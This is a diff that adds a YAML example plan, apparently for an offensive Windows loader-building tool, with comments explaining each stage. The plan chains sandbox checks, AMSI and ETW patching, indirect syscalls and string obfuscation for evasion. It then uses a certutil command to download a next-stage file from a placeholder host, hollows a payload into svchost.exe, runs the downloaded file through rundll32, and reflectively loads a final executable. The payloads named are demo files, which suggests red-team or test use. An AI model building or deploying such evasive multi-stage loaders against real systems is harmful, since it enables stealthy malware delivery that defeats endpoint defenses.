@@ -1,0 +1,108 @@
+# Complex multi-step plan (schema 6).
+#
+# One artifact runs an ordered chain of steps across three payloads and two
+# living-off-the-land commands. It exercises most of the feature:
+#
+#   0. recon   bouncer gate + patch_amsi/patch_etw, then a returning shellcode
+#              (demo_shellcode.bin, `mov eax, 42; ret`) in-process.
+#   1. fetch   living_off_the_land: download the next artifact with a signed
+#              Microsoft binary. `on_fail: continue` so an unreachable host does
+#              not abort.
+#   2. implant process_hollowing: hollow test_payload.exe into svchost.exe. A
+#              separate process, so the loader keeps control and the chain
+#              continues.
+#   3. dwell   sleep: wait between steps.
+#   4. proxy   living_off_the_land: proxy execution via another signed binary,
+#              detached.
+#   5. payload reflective_loading of a PE *executable*. This is a TERMINAL step
+#              (the payload calls ExitProcess), so it must be last —
+#              `plan::validate` rejects it anywhere else.
+#
+# Loader-wide: `syscalls.mode: indirect` (Tartarus Gate) removes the NT imports
+# from the stub's IAT; `build.stub.strings` obfuscates every stub literal. Each
+# payload is embedded and encrypted with its own key/nonce, and each step
+# delivers its own `args`.
+#
+#   cargo run -- build examples/plans/multistage-advanced.yaml
+#   cargo run -- build examples/plans/multistage-advanced.yaml --dry-run
+#   .\dist\multistage_advanced.exe
+
+schema: 6
+name: multistage-advanced
+
+build:
+  payloads:
+    dropper:
+      source: ./examples/payloads/demo_shellcode.bin
+      format: shellcode
+      args: ["--phase=recon"]
+    implant:
+      source: ./examples/payloads/test_payload.exe
+      args: ["--phase=implant"]
+    final:
+      source: ./examples/payloads/test_payload.exe
+
+  stub:
+    syscalls:
+      mode: indirect
+      resolver: tartarus_gate
+    strings:
+      strategy: xor
+      key: random
+  output:
+    path: ./dist/multistage_advanced.exe
+    resources:
+      icon: ./examples/assets/sample.ico
+      version_info:
+        randomize: true
+
+runtime:
+  # 0. Gate + in-process preparation, then a returning shellcode.
+  - technique: bouncer
+    params:
+      mode: all
+      on_fail: silent
+      min_ram_mb: 512
+      not_in_sandbox: true
+    delay_ms: 250
+    on_fail: stop
+  - technique: patch_amsi
+  - technique: patch_etw
+  - technique: reflective_loading
+    params: { payload: dropper }
+
+  # 1. Living off the land: stage the next artifact with a signed binary.
+  - technique: living_off_the_land
+    params:
+      binary: certutil.exe
+      args: ["-urlcache", "-split", "-f", "https://example.invalid/next.bin", "C:\\Users\\Public\\next.bin"]
+      wait: true
+      timeout_s: 30
+      window: hidden
+    on_fail: continue
+
+  # 2. Hollow a full PE into a legitimate process (separate process).
+  - technique: process_hollowing
+    params:
+      payload: implant
+      target: "C:\\Windows\\System32\\svchost.exe"
+    on_fail: stop
+
+  # 3. Dwell between steps.
+  - technique: sleep
+    params: { ms: 1500 }
+
+  # 4. Proxy execution via another signed binary, detached (the loader keeps
+  #    control immediately).
+  - technique: living_off_the_land
+    params:
+      binary: rundll32.exe
+      args: ["C:\\Users\\Public\\next.bin,EntryPoint"]
+      wait: false
+      window: hidden
+    on_fail: exit
+
+  # 5. Terminal step: reflectively load a PE executable (it calls ExitProcess).
+  - technique: reflective_loading
+    params: { payload: final }
+    on_success: continue
